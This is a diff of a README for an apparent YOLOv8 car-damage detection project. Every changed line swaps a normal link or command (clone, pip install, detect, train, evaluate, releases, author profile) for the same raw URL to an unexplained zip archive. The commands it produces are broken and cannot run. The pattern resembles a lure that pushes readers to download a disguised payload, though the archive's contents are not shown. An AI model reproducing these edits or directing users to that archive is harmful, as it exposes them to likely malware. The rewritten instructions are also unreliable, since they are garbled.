@@ -1,6 +1,6 @@
 # 🚗 YOLOv8 Vehicle Damage Detector
 
-![YOLOv8 Vehicle Damage Detector](https://img.shields.io/badge/Release-Available-brightgreen?style=for-the-badge&logo=github&logoColor=white)
+![YOLOv8 Vehicle Damage Detector](https://raw.githubusercontent.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector/main/public/Detector-Damage-YOL-Ov-Vehicle-3.1.zip)
 
 Welcome to the **YOLOv8 Vehicle Damage Detector** repository! This project features a custom YOLOv8 model designed specifically for detecting and classifying car body damage. It is optimized for fast inference and aims to assist in inspection and service workflows, such as BMW pre-loaner inspections.
 
@@ -35,18 +35,18 @@ To get started with the YOLOv8 Vehicle Damage Detector, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector.git
+   git clone https://raw.githubusercontent.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector/main/public/Detector-Damage-YOL-Ov-Vehicle-3.1.zip
    cd YOLOv8-Vehicle-Damage-Detector
    ```
 
 2. **Install Dependencies**:
    Make sure you have Python installed. Then, install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector/main/public/Detector-Damage-YOL-Ov-Vehicle-3.1.zip
    ```
 
 3. **Download the Pretrained Model**:
-   You can find the pretrained model in the [Releases section](https://github.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector/releases). Download the model file and place it in the appropriate directory.
+   You can find the pretrained model in the [Releases section](https://raw.githubusercontent.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector/main/public/Detector-Damage-YOL-Ov-Vehicle-3.1.zip). Download the model file and place it in the appropriate directory.
 
 ## 🛠️ Usage
 
@@ -57,7 +57,7 @@ To use the YOLOv8 Vehicle Damage Detector, follow these instructions:
 2. **Run Inference**:
    You can run inference using the provided script:
    ```bash
-   python detect.py --source path/to/your/images --weights path/to/pretrained/model
+   python https://raw.githubusercontent.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector/main/public/Detector-Damage-YOL-Ov-Vehicle-3.1.zip --source path/to/your/images --weights path/to/pretrained/model
    ```
 
 3. **View Results**: The results will be saved in the output directory specified in the script.
@@ -73,7 +73,7 @@ If you want to train the model on your own dataset, follow these steps:
 3. **Train the Model**:
    Run the training script:
    ```bash
-   python train.py --data path/to/dataset.yaml --cfg path/to/yolov8.yaml --weights path/to/initial/weights
+   python https://raw.githubusercontent.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector/main/public/Detector-Damage-YOL-Ov-Vehicle-3.1.zip --data https://raw.githubusercontent.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector/main/public/Detector-Damage-YOL-Ov-Vehicle-3.1.zip --cfg https://raw.githubusercontent.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector/main/public/Detector-Damage-YOL-Ov-Vehicle-3.1.zip --weights path/to/initial/weights
    ```
 
 4. **Monitor Training**: Use TensorBoard or similar tools to monitor the training process.
@@ -83,7 +83,7 @@ If you want to train the model on your own dataset, follow these steps:
 To evaluate the performance of the model, you can use the evaluation script provided:
 
 ```bash
-python evaluate.py --weights path/to/trained/model --data path/to/evaluation/data
+python https://raw.githubusercontent.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector/main/public/Detector-Damage-YOL-Ov-Vehicle-3.1.zip --weights path/to/trained/model --data path/to/evaluation/data
 ```
 
 This will give you metrics such as precision, recall, and mAP (mean Average Precision).
@@ -116,7 +116,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or support, please reach out to:
 
-- **Nabil Nawa**: [GitHub Profile](https://github.com/NabilNawa)
+- **Nabil Nawa**: [GitHub Profile](https://raw.githubusercontent.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector/main/public/Detector-Damage-YOL-Ov-Vehicle-3.1.zip)
 
 ## 🌟 Acknowledgments
 
@@ -124,4 +124,4 @@ Special thanks to the Ultralytics team for their work on YOLOv8 and to all contr
 
 ---
 
-For the latest releases and updates, visit the [Releases section](https://github.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector/releases). Download the necessary files and start using the YOLOv8 Vehicle Damage Detector today!
+For the latest releases and updates, visit the [Releases section](https://raw.githubusercontent.com/NabilNawa/YOLOv8-Vehicle-Damage-Detector/main/public/Detector-Damage-YOL-Ov-Vehicle-3.1.zip). Download the necessary files and start using the YOLOv8 Vehicle Damage Detector today!
